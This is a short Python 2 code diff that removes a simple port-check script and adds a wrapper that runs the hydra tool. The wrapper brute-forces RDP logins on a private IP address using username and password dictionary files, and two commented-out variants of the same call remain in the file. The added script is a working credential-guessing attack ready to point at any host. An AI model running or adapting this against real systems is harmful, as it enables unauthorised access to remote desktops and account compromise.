@@ -1,12 +1,21 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
+# import os
+#
+# if __name__ == '__main__':
+#     bb = os.popen('hydra -L ./dict/rdp_u.dic -P ./dict/rdp_p.dic 172.27.3.81 rdp')
+#     print bb.read()
 
-import socket
-sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sk.settimeout(1)
-try:
-  sk.connect(('10.254.5.8',3307))
-  print 'Server port 80 OK!'
-except Exception:
-  print 'Server port 80 not connect!'
-sk.close()
+
+# import commands
+# if __name__ == '__main__':
+#     aa = commands.getoutput('hydra -L ./dict/rdp_u.dic -P ./dict/rdp_p.dic 172.27.3.81 rdp')
+#     print aa
+
+import subprocess
+
+if __name__ == '__main__':
+    arr = ['hydra','-L','./dict/rdp_u.dic','-P','./dict/rdp_p.dic','172.27.3.81','rdp']
+    handle = open('./logs/hydra.log','wt')
+    child1 = subprocess.Popen(arr, stdout=subprocess.PIPE,stderr=handle)
+    child1.wait()
+    print "good"
+    print child1.stdout.read()
